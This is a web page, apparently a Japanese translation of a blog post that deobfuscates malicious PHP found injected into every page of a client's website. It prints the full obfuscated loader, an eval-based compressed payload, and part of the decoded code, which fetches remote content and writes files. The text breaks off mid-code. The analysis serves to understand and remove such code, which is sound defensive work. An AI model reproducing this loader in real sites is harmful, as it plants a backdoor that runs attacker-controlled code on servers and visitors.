<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FEDBM7F51Q"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-FEDBM7F51Q');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👖 👏🏻 📶 1つの悪意のあるコードの難読化解除 👨🏻‍⚖️ 💇🏽 🌅</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="新しいクライアントは、何百もの静的ページで構成される自分のWebサイトをコンテンツ管理システムに転送すると同時に、ホスティングにも転送したいと考えていました。 サイトを移動する前に、クイックチェックが実行され、各ページの先頭にコードが見つかりました。 
  
  
  
 

/*versio:2....">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="sitemap" type="application/xml" href="/sitemap.xml"/>

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <script>document.write('<script src="https://pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://tech-in-japan.github.io/index.html"></a>
    <div class="page-header-text">Clever Geek Handbook</div>
  </header>
  <section class="page js-page"><h1>1つの悪意のあるコードの難読化解除</h1><div class="post__text post__text-html js-mediator-article" id="post-content-body"> 新しいクライアントは、何百もの静的ページで構成される自分のWebサイトをコンテンツ管理システムに転送すると同時に、ホスティングにも転送したいと考えていました。 サイトを移動する前に、クイックチェックが実行され、各ページの先頭にコードが見つかりました。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">/*versio:2.19*/</span></span>$QQO0=<span class="hljs-number"><span class="hljs-number">95850</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!function_exists(<span class="hljs-string"><span class="hljs-string">'QQ00OOO0'</span></span>)){$GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>] = <span class="hljs-string"><span class="hljs-string">'AsY3VybAaX2luaXQWywYWxsb3dfdXJsX2ZvcGVu?#MQ(G~aHR0cDovLwwVeJndheT1maWxlX2dldF9jb250ZW50cw_=X3NldG9wdATX2V4ZWMqJndheT1jdXJssyiuQLwZOHhb3Nvbi5pbghP%cnllcGR4LmNvbQ{cGhwYWlkZS5jb20_k!dwWV8zOgNtYZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9ytZnRwMTMdIMi4xOQUU9PMDBPUVFRUTAXfHYmFzZTY0X2RlY29kZQeLF~XsYmFzZTY0X2VuY29kZQVGSFRUUFMemoLb2ZmaHR0cHM6Ly8Mp*vo&amp;SFRUUF9IT1NUDE^.dW5pb24$c2VsZWN0^{&amp;UkVRVUVTVF9VUkkDGU0NSSVBUX05BTUUqNctUVVFUllfU1RSSU5HPwGNSL3RtcC8uZm9udC11bml4NmsL3RtcC8uSUNFLXVuaXgdtVE1QAYVEVNUA_SVE1QRElSL3RtcAqT^dXBsb2FkX3RtcF9kaXI(dG1wOd3AtY29udGVudC91cGxvYWRzVnd3AtY29udGVudC9jYWNoZQZmLgT?admVyc2lvNLQILXBocAWSFRUUF9FWEVDUEhQpb3V0jb2sTSFRUUF9VU0VSX0FHRU5Uc%LAF*Z29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXgZiL3BnLnBocD91PQ!'</span></span>;<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">QQ00OOO0</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($a, $b)</span></span></span></span>{$c=$GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>]; $d=pack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>,<span class="hljs-string"><span class="hljs-string">'6261736536345f6465636f'</span></span>.<span class="hljs-string"><span class="hljs-string">'6465'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $d(substr($c, $a, $b));};$QQQ00QOO0 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">3375</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>);$QQQ00QOO0(<span class="hljs-string"><span class="hljs-string">"/Q00OQOQQ0/e"</span></span>, QQ00OOO0(<span class="hljs-number"><span class="hljs-number">746</span></span>, <span class="hljs-number"><span class="hljs-number">2627</span></span>), <span class="hljs-string"><span class="hljs-string">"Q00OQOQQ0"</span></span>);};</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     コードを通常に戻し、それが何をするのかを調べる必要があります。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="php hljs">$QQO0=<span class="hljs-number"><span class="hljs-number">95850</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!function_exists(<span class="hljs-string"><span class="hljs-string">'QQ00OOO0'</span></span>)) { $GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>] = <span class="hljs-string"><span class="hljs-string">'   base64'</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">QQ00OOO0</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($a, $b)</span></span></span></span>{ $c=$GLOBALS[<span class="hljs-string"><span class="hljs-string">'QQO0'</span></span>]; $d=pack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>,<span class="hljs-string"><span class="hljs-string">'6261736536345f6465636f'</span></span>.<span class="hljs-string"><span class="hljs-string">'6465'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $d(substr($c, $a, $b)); }; $QQQ00QOO0 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">3375</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); $QQQ00QOO0(<span class="hljs-string"><span class="hljs-string">"/Q00OQOQQ0/e"</span></span>, QQ00OOO0(<span class="hljs-number"><span class="hljs-number">746</span></span>, <span class="hljs-number"><span class="hljs-number">2627</span></span>), <span class="hljs-string"><span class="hljs-string">"Q00OQOQQ0"</span></span>); };</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     すべてが正しく、悪意のあるコードでもエラーが発生しないため、攻撃者はQQ00OOO0関数が以前に定義されているかどうかを確認します。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="php hljs">pack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>,<span class="hljs-string"><span class="hljs-string">'6261736536345f6465636f'</span></span>.<span class="hljs-string"><span class="hljs-string">'6465'</span></span>)</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     それは単にbase64_decodeです。 したがって、QQ00OOO0関数は長い文字列の一部を受け取り、入力パラメーターに従って切り捨て、base64からデコードします。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     今、それは私たちにとって明らかです <pre> <code class="php hljs">$QQQ00QOO0 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">3375</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>);</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      -preg_replace。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     長い行のQQ00OOO0（746、2627）は部分文字列をカットして取得します 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(gzuncompress(base64_decode(<span class="hljs-string"><span class="hljs-string">"eJyVV21v2kgQ/isbFEW25Pq8NgZyOZ9ALWks5XAgpFLVIovC0lg1dmSbS6so//1m9oVdEpO7gw+Yndl5n2fG2YZYJ2u2yQq2tjpr1rBqmxXLpqw6tv1ENrti1WRlQUxKumHlxjqNYxrnuUPOTmNKaRyTiEzurq9t8kT0yTZbVWWTbZnVVDtmX5CKNbuqIKYIOH3Wmr6zZpPlDIh5TPPYIadTz0uSqY1i4UMpiJ3ys8SzfIf04D4wwwcVSh53z3HukD5wDLMiS2vWWHsCBYrv2Q6hQM4gDpzlewuLTSJDZZfCoa3dpNEQDcab6aosGlY0tRbR7YECzyYukQ7hk/DI1TJDUBSAon18pGiMDMtrhuapCKXsZ1aDCukzpul0Ok1AFrg/lKcWBgWkg/zWoFBuFQYOtMStgaOeL0MnBVlSjUPe382uk5t5Cj8O+Z+uUgoCqG+/KfhqPPownjmbJfj+JuNsPL+bTeaz0eT2Ei7IIjvO/z6ZTMbv5/P4r3FyN3dIKIpHVutQhkPdQ1GrXZWnq7ysmXGK+WDbh+aXJS9DFrQY7asfOAT4n3VaOY9KK68h3gOofFOXqx/lAyt07Q88rP/Em3oJPkw9eBZGowWqf7iYHCTTNuXksD/Bpc3DjtePbODOx/GcPMlMPZ89Ln9FaAlryNV8fvMbdb2v1dfiqqyb38mTNO0Zjzq8yJKpKLKbq5s0uTXqx+9jo7h4/mk8u42TSYvuu5pV70bfoWlQuBDGhSsFj/eIBidvAJD0zyZnZ8R6ATjknSb/AdboSLkYcehZwxjqDzgWDTcy33t8guAkYBt4yX4+5OWaWZ29jY4SCXy7AiFGcn/xFrqhs23LPcHHdeIXqyPntTCqquUvA4eCgLeW0WyUd1v34KiHXR1iZ+3R9LHKGixcoHuec8p5PYgCLx/4AwSAL1F0kknL659zpAP24UYJ4lf2gi50rARF+rLXX+4aSDinetMpdxmuJiCSre5Lw/YB2B7YrmQ0qmgQ8iqSF10evw7PUguiI7Sc26LsxVTTVN8Dd2hPAr4ody/SZL8n4A7rBaDQoAShnDJT7qRB6YqIS1JikhDS6UBoQtwwSINAkUQzRS8hVLR3VvNiSm/HM+ifL3umwAvQ0oUt8zg8zkJODEAIaNchXVv0wKHegA5AMZXZk2Q3qpuqKfPykVWtSjAugORY5ZuyYsvVPRRVimiyrInMZPSnTjkaCyIfytqSh7rYgpCixYijKOGLvL6IWsBUTcTjsiD2g/8m6xmssk6Ohrrv8QQvxLw/TufD4zV50BdkTGhbCLtej9fk4t/Eu+YC4vvYEjBd35IoUin6HKYWlLpKa5uhez9FcQAKRcPtOlSTyJVN4UqQl53ASxg+OY3WWVUsAXXT9DK+Hqep7X6IZzBpk9ln0HYzmo3gkffJVACpgDjTq77cx/RRqPq5zdE+xWpeHCH2sWUFcTz5dOTaIQWRZtB+R0nTR+cBHjnk9dIY4t4EVtuOCo5GsxBT122noPvtpBB0+T6QDhpNRhJbDbcW2ARFh52oxUQc8oxS0c+tKRGrb50iwi+/8c3buMlt4eshP7wg30D/j/3EarYP0WuD+2Lyy0q6eIFSHVwr0s/p6G5+1VlEkWRTM0Eh/FDODi124GOCHIXQhsJzqoYEgrpJ6GKa1L6EmxRAkgTrtobseVQ2JE499vcyV7dAxtvm9RBDDwZyD1EmsDmqwtLeWB5/VAEXrzkQQa6rKXere/GXv62s8t2apWWxYupQAN8TUf08hM2UFSvcKuSRnDYeb7Dh2+jdk/12gN5qu9FcXb4DmE5hNYawZcjKw4X2NbaDCc6eehJFl3yTl/PKcJW/vPDF01xd+/wdoYsJ5X7phPb9EIOsSssgBOK14nUN9Lu+vMKrRgz4nO/DxrsmLl6wsOnXzYsXKXk+rHz4/gMmng4H"</span></span>)));</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     ご覧のとおり、最終的にはすべて上記で取得したコードの実行になります。 このコードが行うことを解析してみましょう。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     デコード後に得られるものは次のとおりです。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>)){ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">determinator_feof</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($II1Ill, &amp;$I111II = NULL)</span></span></span><span class="hljs-function"> </span></span>{ $I111II = microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> feof($II1Ill); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getfile</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($IlI1lI, $Q00OOQ)</span></span></span></span>{ $IIII11 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>); $IllllI = $IIII11.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>); @ini_set(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">19</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>), <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@ini_get(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">19</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>)) == QQ00OOO0(<span class="hljs-number"><span class="hljs-number">41</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)) { $I111I1=@file_get_contents(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">46</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>) . $IlI1lI . $Q00OOQ. QQ00OOO0(<span class="hljs-number"><span class="hljs-number">59</span></span>, <span class="hljs-number"><span class="hljs-number">30</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $I111I1; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (function_exists($IllllI)){ $QQOQQ0 = @$IllllI(); $Q0000O = $IIII11.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">91</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>); $I1I1II = $IIII11.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">7</span></span>); @$Q0000O($QQOQQ0, CURLOPT_URL, QQ00OOO0(<span class="hljs-number"><span class="hljs-number">46</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>) . $IlI1lI . $Q00OOQ. QQ00OOO0(<span class="hljs-number"><span class="hljs-number">110</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>)); @$Q0000O($QQOQQ0, CURLOPT_HEADER,<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); @$Q0000O($QQOQQ0, CURLOPT_RETURNTRANSFER,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); @$Q0000O($QQOQQ0, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number"><span class="hljs-number">5</span></span>); $Il11II = @$I1I1II($QQOQQ0); @curl_close($QQOQQ0); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($Il11II)){$Il11II = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>);} <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $Il11II; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $II1Ill = @fsockopen($IlI1lI, <span class="hljs-number"><span class="hljs-number">80</span></span>, $QO0Q0O, $QQ0QO0, <span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($II1Ill) { $Ill111 = QQ00OOO0(<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); $I111II = <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"GET {$Q00OOQ}&amp;way=socket HTTP/1.0\r\nHost: {$IlI1lI}\r\n"</span></span>); $QOQ00O = PHP_OS.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">127</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>).PHP_VERSION; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"User-Agent: {$QOQ00O}\r\n\r\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!determinator_feof($II1Ill, $I111II) &amp;&amp; (microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) - $I111II) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>){ $Ill111 .= @fgets($II1Ill, <span class="hljs-number"><span class="hljs-number">128</span></span>); } @fclose($II1Ill); $Q0OQOQ = explode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Ill111); <span class="hljs-keyword"><span class="hljs-keyword">unset</span></span>($Q0OQOQ[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> implode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Q0OQOQ); } } } $Il1lll = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>(QQ00OOO0(<span class="hljs-number"><span class="hljs-number">133</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">146</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>), QQ00OOO0(<span class="hljs-number"><span class="hljs-number">161</span></span>, <span class="hljs-number"><span class="hljs-number">15</span></span>)); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">write</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($QOO000,$QQ00O0)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($Q00QOO=@fopen($QOO000,QQ00OOO0(<span class="hljs-number"><span class="hljs-number">179</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>))){ @fwrite($Q00QOO,$QQ00O0); @fclose($Q00QOO); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">output</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($Q000QQ, $Q0QQ0O)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> QQ00OOO0(<span class="hljs-number"><span class="hljs-number">181</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>).$Q000QQ.QQ00OOO0(<span class="hljs-number"><span class="hljs-number">185</span></span>, <span class="hljs-number"><span 